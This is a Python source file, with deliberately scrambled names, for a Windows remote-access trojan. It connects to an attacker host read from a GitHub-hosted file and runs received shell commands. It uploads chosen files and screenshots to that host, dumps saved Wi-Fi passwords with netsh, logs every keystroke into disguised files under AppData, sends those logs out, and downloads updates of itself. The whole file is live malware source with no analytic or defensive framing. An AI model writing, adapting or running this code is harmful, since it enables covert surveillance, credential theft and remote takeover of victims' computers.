import subprocess,socket,time,requests,os,logging
from PIL import ImageGrab
from pynput.keyboard import Key, Listener
from datetime import datetime
lqfdyAsBBvZmHsM = ""
XEylNipKOPTRKsUvGBU = ""
TnIYqtitSb = "09.12.24.0"
VhIRdeifXyW = "!"
falRiLvuhaPcDdmEgwzDa = "https://raw.githubusercontent.com/eb-repo/files/refs/heads/main/info.txt"
XIMQcaz = "https://raw.githubusercontent.com/eb-repo/scripts/refs/heads/main/"
LOGGING_PATH = os.path.expanduser("~\\AppData\\Local\\")
def SufhmIvhVEYZsfUXScykRc(host, port):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, int(port) if port.isdecimal() else 5002))
	return s
def xUeTFPkSNJkE(s):
	hsBvKPwwIKiVKKdOgdgFRS = s.recv(1024)
	if len(hsBvKPwwIKiVKKdOgdgFRS)==0:
		return True
	YLHRVkId = hsBvKPwwIKiVKKdOgdgFRS.decode("utf-8").replace("\n","")
	if not YLHRVkId.startswith(VhIRdeifXyW):
		proc = subprocess.run(YLHRVkId, shell=True, capture_output=True)
		dGazwviRxheHklqtzrR = proc.stdout + proc.stderr
		s.send(dGazwviRxheHklqtzrR)
		return
	ejeZNWHybBDIW = YLHRVkId.split(" ")[0][1:]
	if ejeZNWHybBDIW == "download":
		lpZtmNnAA(s, YLHRVkId)
	elif ejeZNWHybBDIW == "screenshot":
		LOOIGiMQqcJSGxrQpjbrrZ(s)
	elif ejeZNWHybBDIW == "basename":
		s.send(bytes(os.path.basename(__file__)+"\n", "utf-8"))
	elif ejeZNWHybBDIW == "update":
		manualUpdate(s)
	elif ejeZNWHybBDIW == "wifi":
		getWifiPasswords(s)
def lpZtmNnAA(s, YLHRVkId):
	qnOaOzWRZJimNJwoinlUPM = YLHRVkId.replace(VhIRdeifXyW+"download ","").split(",")
	dGazwviRxheHklqtzrRs = ""
	for f in qnOaOzWRZJimNJwoinlUPM:
		dGazwviRxheHklqtzrRs += AZkjkBVtNVCnYnBs(f, "api/file/", { "type":os.path.splitext(f)[1] })
	s.send(bytes(dGazwviRxheHklqtzrRs, "utf-8"))
def LOOIGiMQqcJSGxrQpjbrrZ(s):
	IAOtFJhGhFj = ImageGrab.grab(bbox=None,
		include_layered_windows=False,all_screens=True,xdisplay=None)
	DjPogkUjJnIvGhPeDsE = os.path.expanduser("~\\AppData\\Local\\")+"ss.jpg"
	IAOtFJhGhFj.save(DjPogkUjJnIvGhPeDsE)
	IAOtFJhGhFj.close()
	r = AZkjkBVtNVCnYnBs(DjPogkUjJnIvGhPeDsE, "api/sscap")
	os.remove(DjPogkUjJnIvGhPeDsE)
	s.send(bytes(r,"utf-8"))
def AZkjkBVtNVCnYnBs(TyzYixbidQepxJTvGmojtz, uwCiTZdTbwFTolwdHarjUu, jBxNJrmmPIDRmVGQpcPO=None):
	if not os.path.isfile(TyzYixbidQepxJTvGmojtz):
		return "[!] 404: "+TyzYixbidQepxJTvGmojtz+"\n"
	headers = {"user":os.getlogin()}
	if jBxNJrmmPIDRmVGQpcPO is not None:
		headers = {**headers, **jBxNJrmmPIDRmVGQpcPO}
	requests.post("http://"+lqfdyAsBBvZmHsM+":5555/"+uwCiTZdTbwFTolwdHarjUu,
		files={"file":open(TyzYixbidQepxJTvGmojtz, "rb")},
		headers=headers)
	return "[+] 200: "+TyzYixbidQepxJTvGmojtz+"\n"
def manualUpdate(s):
	h, p, v = getStartupInfo(True)
	if (v != TnIYqtitSb):
		update(v)
		s.send(b"[+] 200\n")
	else:
		s.send(b"[-] 304\n")
def getWifiPasswords(s):
	profiles = [line.split(":")[1].strip().replace("\r","") for line in subprocess.check_output("netsh wlan show profiles", creationflags=0x08000000, shell=True).decode().split("\n") if "User Profile" in line]
	wifiPasswords = ""
	for p in profiles:
		try: wifiPasswords+=f"    {p} - " + subprocess.check_output(f"netsh wlan show profile \"{p}\" key=clear", shell=True).decode().split("Key Content")[1].split("Cost")[0].replace(":","").strip()+"\n"
		except: wifiPasswords+=f"    {p} - N/A\n"
	s.send(wifiPasswords)
def update(UwwXOakMxA):
	UKodjhdLlvxYXEAvQI = os.path.basename(__file__)
	fileType = UKodjhdLlvxYXEAvQI.split(".")[-1]
	YwjRHrxcYvU = UKodjhdLlvxYXEAvQI.split(".")[0]+"."+UwwXOakMxA+".pyw" if fileType.startswith("py") else ".exe"
	ZGaOoTHyGtj = os.path.join(os.getcwd(), YwjRHrxcYvU)
	if not os.path.isfile(ZGaOoTHyGtj):
		with open(YwjRHrxcYvU, "w+") as f:
			f.write(requests.get(XIMQcaz+"file."+ "pyw" if ZGaOoTHyGtj.split(".")[-1].startswith("py") else "exe").text)
def getStartupInfo(force=False):
	global lqfdyAsBBvZmHsM, XEylNipKOPTRKsUvGBU
	if force or lqfdyAsBBvZmHsM == "" or XEylNipKOPTRKsUvGBU == "":
		hsBvKPwwIKiVKKdOgdgFRS = requests.get(falRiLvuhaPcDdmEgwzDa).text.replace("\n","").split(":")
		lqfdyAsBBvZmHsM = hsBvKPwwIKiVKKdOgdgFRS[0].strip()
		XEylNipKOPTRKsUvGBU = hsBvKPwwIKiVKKdOgdgFRS[1].strip()
		UwwXOakMxA = hsBvKPwwIKiVKKdOgdgFRS[2].strip()
	return lqfdyAsBBvZmHsM, XEylNipKOPTRKsUvGBU, UwwXOakMxA
def nIQdUWtenSSBIbL():
	pass
def checkKeyLogs():
	try:
		logFileName = "settings.xpb"
		logFiles = sorted([file for file in os.listdir(LOGGING_PATH) if os.path.isfile(LOGGING_PATH+"\\"+file) and file.endswith(logFileName.split(".")[-1])])
		if logFileName in logFiles:
			logFiles.remove(logFileName)
		logFileFullPath = os.path.join(LOGGING_PATH,logFileName)
		if len(logFiles) > 0:
			with open(logFileFullPath, "ab+") as f:
				for file in logFiles:
					temp = os.path.join(LOGGING_PATH,file)
					with open(temp,"rb") as tf:
						f.write(tf.read())
					os.remove(temp)
		AZkjkBVtNVCnYnBs(logFileFullPath, "api/log")
		if os.path.isfile(logFileFullPath):
			os.remove(logFileFullPath)
	except Exception as e:
		print(e)
		pass
def startKeyLogging():
	logging.basicConfig(filename=(LOGGING_PATH+str(datetime.today().strftime("%d")) + ".xpb"),
		level=logging.DEBUG,format="%(asctime)s %(message)s", datefmt="%Y-%m-%d %H:%M:%S")
	def logKey(k):
		logging.info(str(k))
	k=Listener(on_press=logKey)
	loggers = [logging.getLogger(name) for name in logging.root.manager.loggerDict if not name.startswith("pynput")]
	for l in loggers:
		l.setLevel(logging.CRITICAL)
	k.start()
def fObypkelzeWrWbZhJdeKEte():
	h, p, v = GXvaOeWZJg()
	checkKeyLogs()
	nIQdUWtenSSBIbL()
	if TnIYqtitSb != v:
		update(v)
	startKeyLogging()
	lGRxnRdOS = bytes("["+TnIYqtitSb+"] - "+os.getlogin()+" >> ", "utf-8")
	while True:
		try:
			while True:
				tusupdnrcJzKSWeks=False
				try:
					s=SufhmIvhVEYZsfUXScykRc(h, p)
					while not tusupdnrcJzKSWeks:
						s.send(lGRxnRdOS)
						tusupdnrcJzKSWeks=xUeTFPkSNJkE(s)
					s.close()
				except:
					pass
				time.sleep(5)
		except:
			time.sleep(5)
fObypkelzeWrWbZhJdeKEte()
